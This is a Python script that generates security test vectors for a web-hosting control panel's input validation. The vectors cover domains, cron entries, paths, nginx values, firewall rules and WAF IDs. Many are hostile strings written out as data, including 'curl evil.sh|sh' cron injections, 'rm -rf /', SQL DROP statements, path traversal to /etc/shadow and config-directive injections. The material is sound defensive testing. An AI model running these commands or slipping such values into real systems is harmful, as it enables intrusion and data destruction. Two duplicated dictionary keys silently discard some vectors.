#!/usr/bin/env python3
"""Sinh contracts/test-vectors/evil-inputs.json.

Mỗi vector: input, expect (reject|accept), layer:
- schema:   JSON Schema (defs.schema.json) phải tự quyết định đúng; check_contracts.py kiểm.
- semantic: schema có thể chấp nhận, tầng nghiệp vụ (Laravel) và agent (Go) BẮT BUỘC từ chối;
            test PHP/Go ở Phase 3–6 dùng lại đúng các vector này.
"""
import json
from pathlib import Path

OUT = Path(__file__).resolve().parents[1] / "test-vectors" / "evil-inputs.json"

R, A = "reject", "accept"
V = {
    "domain": ("Domain", [
        ("anphat.vn", A, "schema", "Domain hợp lệ"),
        ("shop.anphat.vn", A, "schema", "Subdomain hợp lệ"),
        ("xn--bcher-kva.example", A, "schema", "Punycode hợp lệ"),
        ("example.xn--p1ai", A, "schema", "TLD punycode"),
        ("Anphat.VN", R, "schema", "Chữ hoa: phải chuẩn hóa chữ thường trước"),
        ("anphat.vn;rm -rf /", R, "schema", "Chèn lệnh shell"),
        ("anphat.vn\nserver_name evil.com", R, "schema", "Chèn dòng cấu hình nginx"),
        ("../etc/passwd", R, "schema", "Path traversal"),
        ("-anphat.vn", R, "schema", "Nhãn bắt đầu bằng gạch nối"),
        ("anphat-.vn", R, "schema", "Nhãn kết thúc bằng gạch nối"),
        ("a" * 64 + ".vn", R, "schema", "Nhãn dài hơn 63 ký tự"),
        ("anphat", R, "schema", "Thiếu TLD"),
        ("192.168.1.10", R, "schema", "Địa chỉ IP thay cho domain"),
        ("*.anphat.vn", R, "schema", "Wildcard không cho phép ở website"),
        ("anphat.vn ", R, "schema", "Khoảng trắng thừa"),
        ("an phat.vn", R, "schema", "Khoảng trắng giữa"),
        ("anphat.vn.", R, "schema", "Dấu chấm cuối (FQDN) phải bỏ trước"),
        ("bücher.example", R, "schema", "Unicode chưa chuyển punycode"),
        ("localhost.localdomain", R, "semantic", "Tên nội bộ bị cấm"),
        ("admin.itso.local", R, "semantic", "Trùng domain của panel"),
        ("anphat.vn{}", R, "schema", "Ký tự ngoặc nhọn phá cú pháp nginx"),
    ]),
    "username": ("Username", [
        ("anphat", A, "schema", "Hợp lệ"),
        ("mktitso", A, "schema", "Hợp lệ"),
        ("root", R, "schema", "Username hệ thống"),
        ("mysql", R, "schema", "Username dịch vụ"),
        ("itso", R, "schema", "Username của panel"),
        ("Anphat", R, "schema", "Chữ hoa"),
        ("1anphat", R, "schema", "Bắt đầu bằng số"),
        ("ab", R, "schema", "Ngắn hơn 3 ký tự"),
        ("a" * 17, R, "schema", "Dài hơn 16 ký tự"),
        ("an-phat", R, "schema", "Gạch nối"),
        ("anphat;id", R, "schema", "Chèn lệnh"),
        ("www-data", R, "schema", "User web server"),
        ("ubuntu", R, "semantic", "User mặc định của cloud image (danh sách cấm mở rộng ở agent)"),
    ]),
    "path": ("RelPath", [
        (".", A, "schema", "Gốc home"),
        ("sites/anphat.vn/public/index.php", A, "schema", "Đường dẫn tương đối hợp lệ"),
        (".env", A, "schema", "File ẩn hợp lệ"),
        ("sites/anphat.vn/.well-known/acme-challenge/x", A, "schema", "Thư mục ẩn hợp lệ"),
        ("/etc/shadow", R, "schema", "Đường dẫn tuyệt đối"),
        ("../other/secret", R, "schema", "Thoát lên thư mục cha"),
        ("sites/../../etc/passwd", R, "schema", "Traversal giữa đường dẫn"),
        ("sites/..", R, "schema", "Kết thúc bằng .."),
        ("sites/./x", R, "schema", "Đoạn . không chuẩn hóa"),
        ("sites//x", R, "schema", "Hai dấu gạch chéo liên tiếp"),
        ("sites/x\u0000.php", R, "schema", "Ký tự NUL"),
        ("sites/x\n.php", R, "schema", "Ký tự xuống dòng"),
        ("", R, "schema", "Rỗng"),
        ("sites/", R, "schema", "Kết thúc bằng gạch chéo"),
        ("sites/link-to-root/etc", R, "semantic", "Symlink trỏ ra ngoài home: agent kiểm sau khi resolve (openat2 RESOLVE_BENEATH)"),
        ("..%2f..%2fetc%2fpasswd", A, "semantic", "Chuỗi URL-encoded là tên file hợp lệ; API không được decode hai lần"),
    ]),
    "db_name": ("DbName", [
        ("anphat_web", A, "schema", "Hợp lệ"),
        ("anphat_shop2", A, "schema", "Có số"),
        ("anphat-web", R, "schema", "Gạch nối"),
        ("anphat_web; DROP DATABASE mysql", R, "schema", "SQL injection"),
        ("`anphat`", R, "schema", "Backtick"),
        ("Anphat_web", R, "schema", "Chữ hoa"),
        ("_anphat", R, "schema", "Bắt đầu bằng gạch dưới"),
        ("a" * 65, R, "schema", "Dài hơn 64 ký tự"),
        ("mysql", R, "semantic", "DB hệ thống"),
        ("information_schema", R, "semantic", "DB hệ thống"),
        ("other_web", R, "semantic", "Không có tiền tố username của account"),
    ]),
    "cron_expr": ("CronExpr", [
        ("*/15 * * * *", A, "schema", "Mỗi 15 phút"),
        ("0 2 * * *", A, "schema", "2 giờ sáng"),
        ("0 0 1 1-12/3 *", A, "schema", "Theo quý"),
        ("* * * * *", R, "semantic", "Mỗi phút: vượt cron_min_interval_min (5) của gói"),
        ("@reboot", R, "schema", "Từ khóa đặc biệt không cho phép"),
        ("* * * * * root rm -rf /", R, "schema", "Trường thừa (định dạng /etc/crontab)"),
        ("*/5 * * * *\n* * * * * curl evil.sh|sh", R, "schema", "Chèn dòng crontab"),
        ("0 2 * *", R, "schema", "Thiếu trường"),
        ("0 2 * * MON", R, "schema", "Tên thứ (chỉ cho phép dạng số)"),
        ("99 2 * * *", R, "semantic", "Giá trị ngoài miền (phút 0–59): parser nghiệp vụ kiểm"),
        ("0 2 1 * 1", R, "semantic", "DOM và DOW cùng giới hạn: systemd OnCalendar không có nghĩa OR (D-74)"),
        ("*/0 * * * *", R, "semantic", "Bước 0"),
        ("0 2 31 2 *", R, "semantic", "Ngày không bao giờ tồn tại (31/2): agent từ chối OnCalendar rỗng"),
    ]),
    "cron_command": ("CronCommand", [
        ("php artisan schedule:run", A, "schema", "Hợp lệ"),
        ("/usr/bin/php8.3 bin/cleanup.php --days=7", A, "schema", "Hợp lệ"),
        ("php a.php\n* * * * * curl evil.sh|sh", R, "schema", "Chèn dòng crontab"),
        ("php a.php\r", R, "schema", "Ký tự CR"),
        ("", R, "schema", "Rỗng"),
        ("x" * 1025, R, "schema", "Quá dài"),
    ]),
    "secret_password": ("SecretPassword", [
        ("Xk9!vT2#pQ7@wL4z", A, "schema", "Mật khẩu mạnh"),
        ("short", R, "schema", "Ngắn hơn 12 ký tự"),
        ("abc'defghijkl; DROP USER root", R, "schema", "Dấu nháy đơn: chèn SQL"),
        ("abcdefghijk\\l", R, "schema", "Gạch chéo ngược"),
        ("abcdef ghijkl", R, "schema", "Khoảng trắng"),
        ("abcdefghijkl\n", R, "schema", "Xuống dòng (stdin pure-pw/chpasswd)"),
        ('abcdefgh"ijkl', R, "schema", "Dấu nháy kép"),
        ("abcdefghijk$(id)", R, "schema", "Ký tự $ và ngoặc"),
    ]),
    "ftp_username": ("FtpUsername", [
        ("anphat_deploy", A, "schema", "Hợp lệ"),
        ("anphat-deploy", R, "schema", "Gạch nối"),
        ("anphat_deploy:x:0:0", R, "schema", "Chèn trường passwd"),
        ("Anphat_dev", R, "schema", "Chữ hoa"),
        ("other_deploy", R, "semantic", "Không có tiền tố username của account"),
        ("anphat", R, "semantic", "Trùng user Linux chính (dùng SFTP)"),
    ]),
    "nginx_size": ("NginxSize", [
        ("64m", A, "schema", "Hợp lệ"),
        ("1g", A, "schema", "Hợp lệ"),
        ("64m; include /etc/shadow", R, "schema", "Chèn directive"),
        ("64M", R, "schema", "Chữ hoa (chuẩn hóa trước)"),
        ("-1", R, "schema", "Số âm"),
        ("64mb", R, "schema", "Đơn vị không hợp lệ"),
    ]),
    "header_value": ("HeaderValue", [
        ("SAMEORIGIN", A, "schema", "Hợp lệ"),
        ("max-age=31536000, includeSubDomains", A, "schema", "Hợp lệ"),
        ("x; add_header Set-Cookie evil", R, "schema", "Chèn directive bằng ;"),
        ("x }\nserver { listen 80;", R, "schema", "Phá khối cấu hình"),
        ("$request_uri", R, "schema", "Biến nginx"),
        ("x\" always", R, "schema", "Thoát chuỗi"),
    ]),
    "php_version": ("PhpVersion", [
        ("8.3", A, "schema", "Hợp lệ"),
        ("8.3; rm -rf /", R, "schema", "Chèn lệnh"),
        ("../8.3", R, "schema", "Traversal tới socket khác"),
        ("7.4", R, "semantic", "Phiên bản không có trong gói/không được cài"),
    ]),
    "hostname": ("Hostname", [
        ("srv-hn-01", A, "schema", "Hợp lệ"),
        ("srv01.itso.local", A, "schema", "FQDN hợp lệ"),
        ("SRV01", R, "schema", "Chữ hoa"),
        ("srv01;reboot", R, "schema", "Chèn lệnh"),
        ("-srv01", R, "schema", "Bắt đầu bằng gạch nối"),
        ("srv01\nevil", R, "schema", "Xuống dòng"),
        ("", R, "schema", "Rỗng"),
        ("srv 01", R, "schema", "Khoảng trắng"),
    ]),
    "service_name": ("ServiceName", [
        ("nginx", A, "schema", "Trong allowlist"),
        ("php8.3-fpm", A, "schema", "Trong allowlist"),
        ("itso-agent", R, "schema", "Agent không tự điều khiển mình"),
        ("sshd; rm -rf /", R, "schema", "Chèn lệnh"),
        ("../../etc/systemd/system/evil", R, "schema", "Traversal"),
        ("docker", R, "schema", "Ngoài allowlist"),
    ]),
    "recipe": ("Recipe", [
        ("quota", A, "schema", "Recipe có sẵn"),
        ("acl", A, "schema", "Recipe có sẵn"),
        ("https://evil.example/x.sh", R, "schema", "URL tùy ý"),
        ("quota && curl evil|sh", R, "schema", "Chèn lệnh"),
        ("apache2", R, "schema", "Ngoài allowlist"),
        ("nginx", A, "schema", "Recipe Phase 5"),
        ("php8.3", A, "schema", "Recipe Phase 5"),
        ("php8.1", R, "schema", "PHP ngoài kho Ubuntu (cần PPA, D-68)"),
        ("fail2ban", A, "schema", "Recipe Phase 7"),
        ("modsecurity", A, "schema", "Recipe Phase 7 (WAF, D-78)"),
        ("coraza", R, "schema", "Coraza: DEFERRED"),
    ]),
    # Phase 5: giá trị đi vào cấu hình Nginx/PHP/ACME.
    "header_value": ("HeaderValue", [
        ("SAMEORIGIN", A, "schema", "Giá trị header hợp lệ"),
        ("max-age=31536000", A, "schema", "Có dấu = hợp lệ"),
        ("x\r\nSet-Cookie: a=b", R, "schema", "CRLF tách header"),
        ("a; include /etc/passwd", R, "schema", "Dấu ; kết thúc directive nginx"),
        ("${host}", R, "schema", "Biến nginx"),
        ("\"quoted\"", R, "schema", "Dấu nháy phá cú pháp"),
        ("a } server { listen 80", R, "schema", "Ngoặc nhọn đóng block"),
    ]),
    "url_path": ("UrlPath", [
        ("/old-shop", A, "schema", "Đường dẫn redirect hợp lệ"),
        ("/a/b-c_d.html", A, "schema", "Có ký tự an toàn"),
        ("old-shop", R, "schema", "Không bắt đầu bằng /"),
        ("/a b", R, "schema", "Khoảng trắng"),
        ("/a;return 200", R, "schema", "Chèn directive"),
        ("/a{", R, "schema", "Ngoặc nhọn"),
        ("/$uri", R, "schema", "Biến nginx"),
    ]),
    "redirect_target": ("RedirectTarget", [
        ("https://shop.anphat.vn/", A, "schema", "URL đích hợp lệ"),
        ("http://anphat.vn:8080/sale", A, "schema", "Có port và path"),
        ("javascript:alert(1)", R, "schema", "Scheme nguy hiểm"),
        ("https://anphat.vn/a b", R, "schema", "Khoảng trắng"),
        ("https://anphat.vn/$request_uri", R, "schema", "Biến nginx"),
        ("//evil.example", R, "schema", "URL không scheme"),
        ("https://anphat.vn/x;rewrite", R, "schema", "Dấu ;"),
    ]),
    "nginx_size": ("NginxSize", [
        ("64m", A, "schema", "Hợp lệ"),
        ("1g", A, "schema", "Hợp lệ"),
        ("64m;", R, "schema", "Dấu ;"),
        ("-1", R, "schema", "Số âm"),
        ("64M", R, "schema", "Chữ hoa (chuẩn hóa trước)"),
    ]),
    "php_extension": ("PhpExtension", [
        ("intl", A, "schema", "Extension trong allowlist"),
        ("redis", A, "schema", "Extension trong allowlist"),
        ("php8.3-intl", R, "schema", "Tên gói thay cho tên extension"),
        ("xdebug", R, "schema", "Ngoài allowlist (không dùng cho production)"),
        ("intl curl", R, "schema", "Nhiều giá trị trong một chuỗi"),
    ]),
    "email": ("Email", [
        ("it@anphat.vn", A, "schema", "Email hợp lệ cho ACME"),
        ("it@anphat.vn\n--server=https://evil", R, "schema", "Chèn tham số dòng lệnh lego"),
        ("--email=x@y.z", R, "schema", "Bắt đầu như cờ dòng lệnh"),
        ("it@localhost", R, "schema", "Thiếu TLD"),
    ]),
    # Phase 7: tường lửa, SSH, WAF, quét mã độc (D-76…D-79).
    "port": ("Port", [
        (22, A, "schema", "Cổng SSH"),
        (0, R, "schema", "Cổng 0"),
        (70000, R, "schema", "Ngoài 1–65535"),
        ("22", R, "schema", "Chuỗi thay cho số"),
    ]),
    "cidr": ("Cidr", [
        ("10.10.5.0/24", A, "schema", "CIDR IPv4"),
        ("2001:db8::/32", A, "schema", "CIDR IPv6"),
        ("10.0.0.0/33", R, "schema", "Prefix > 32"),
        ("0.0.0.0/0; flush ruleset", R, "schema", "Chèn lệnh nft"),
        ("999.1.1.1/8", A, "semantic", "Octet > 255: Laravel + agent (net/netip) phải từ chối"),
        ("10.0.0.1/8", A, "semantic", "Có bit host: chuẩn hóa hoặc từ chối ở tầng nghiệp vụ"),
    ]),
    "firewall_rule": ("FirewallRule", [
        ({"priority": 100, "action": "accept", "direction": "in", "protocol": "tcp", "ports": "80,443",
          "source": "0.0.0.0/0", "comment": "web"}, A, "schema", "Rule hợp lệ"),
        ({"priority": 10, "action": "drop", "direction": "in", "protocol": "tcp", "ports": "22",
          "source": "10.10.5.20/32", "comment": "chặn ssh"}, A, "semantic",
         "Chặn cổng SSH từ IP người áp dụng: bất biến chống tự khóa (Laravel + agent) phải từ chối"),
        ({"priority": 10, "action": "drop", "direction": "in", "protocol": "tcp", "ports": "1-65535",
          "source": "0.0.0.0/0", "comment": "chặn hết"}, A, "semantic",
         "Dải cổng nuốt SSH/panel với nguồn 0.0.0.0/0: phải từ chối (would_lock_out)"),
        ({"priority": 100, "action": "accept", "direction": "in", "protocol": "tcp", "ports": "80; flush ruleset",
          "source": "0.0.0.0/0", "comment": ""}, R, "schema", "Chèn lệnh vào ports"),
        ({"priority": 100, "action": "accept", "direction": "in", "protocol": "tcp", "ports": "99999",
          "source": "0.0.0.0/0", "comment": ""}, A, "semantic", "Port > 65535 trong chuỗi: agent phải từ chối"),
        ({"priority": 100, "action": "accept", "direction": "in", "protocol": "tcp", "ports": "80",
          "source": "0.0.0.0/0", "comment": "x\"\nadd rule inet filter input accept"}, R, "schema", "Chèn dòng qua comment"),
        ({"priority": 100, "action": "jump", "direction": "in", "protocol": "tcp", "ports": "80",
          "source": "0.0.0.0/0", "comment": ""}, R, "schema", "Action ngoài allowlist"),
    ]),
    "waf_rule_id": ("WafRuleId", [
        (942100, A, "schema", "Rule CRS SQLi"),
        ("942100", R, "schema", "Chuỗi thay cho số"),
        ("942100\nSecRuleEngine Off", R, "schema", "Chèn directive ModSecurity"),
        (-1, R, "schema", "Số âm"),
    ]),
    "scan_path": ("RelPath", [
        ("sites/anphat.vn/public", A, "schema", "Thư mục quét trong home"),
        ("../lehoa", R, "schema", "Traversal sang account khác"),
        ("/etc", R, "schema", "Đường dẫn tuyệt đối"),
        ("sites/../../root", R, "schema", "Traversal giữa đường dẫn"),
    ]),
    "confirm_token": ("ConfirmToken", [
        ("Zk3q9xN0bW1yT7uV5sR2pL8mC4hJ6dFa", A, "schema", "Token đúng định dạng"),
        ("short", R, "schema", "Quá ngắn"),
        ("Zk3q9xN0bW1yT7uV5sR2pL8mC4hJ6dFa;x", R, "schema", "Ký tự lạ"),
        ("Zk3q9xN0bW1yT7uV5sR2pL8mC4hJ6dFb", A, "semantic", "Token sai (không khớp lần áp dụng): agent trả precondition_failed"),
    ]),
    "fail2ban_jail": ("Fail2banJail", [
        ("sshd", A, "schema", "Jail có sẵn"),
        ("recidive", R, "schema", "Jail ngoài allowlist"),
        ("sshd]\naction = shell", R, "schema", "Chèn section cấu hình"),
    ]),
}


def main():
    cats = {}
    total = 0
    for cat, (schema, vectors) in V.items():
        cats[cat] = {"schema": f"agent-ops/defs.schema.json#/$defs/{schema}", "vectors": [
            {"input": x, "expect": e, "layer": layer, "note": note} for x, e, layer, note in vectors]}
        total += len(vectors)
    OUT.write_text(json.dumps({"version": 1, "total": total, "categories": cats}, ensure_ascii=False, indent=2) + "\n",
                   encoding="utf-8")
    print(f"Đã sinh evil-inputs: {total} vector")


if __name__ == "__main__":
    main()
